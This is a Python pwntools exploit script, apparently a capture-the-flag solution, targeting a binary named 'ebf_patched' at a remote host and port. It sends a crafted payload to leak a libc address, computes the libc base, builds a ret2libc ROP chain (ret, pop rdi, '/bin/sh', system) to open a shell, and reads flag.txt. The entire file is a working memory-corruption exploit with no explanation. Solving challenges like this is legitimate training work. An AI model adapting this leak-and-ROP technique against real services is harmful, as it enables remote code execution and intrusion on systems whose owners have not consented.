#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'ebf_patched'
HOST = '103.77.175.40'
PORT = 6067

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*main+17
b*main+131
b*main+158
ni 0xbdf
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here



payload = b'(' * 0x38
payload += b'.>' * 8
payload += b'<' * 8
payload += b',>' * 32
payload += b')'* 0x38
p.sendlineafter(b'> ', payload)

leak = u64(p.recvn(8))
offset =  0x2a1ca
libc.address = leak - offset
log.info(f'Libc base: {hex(libc.address)}')

system = libc.sym['system']
pop_rdi_ret = 0x000000000010f78b + libc.address
binsh = next(libc.search(b'/bin/sh\x00'))
ret = 0x000000000002882f + libc.address

p.send(p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system))
p.sendline(b'cat flag.txt')
p.interactive()
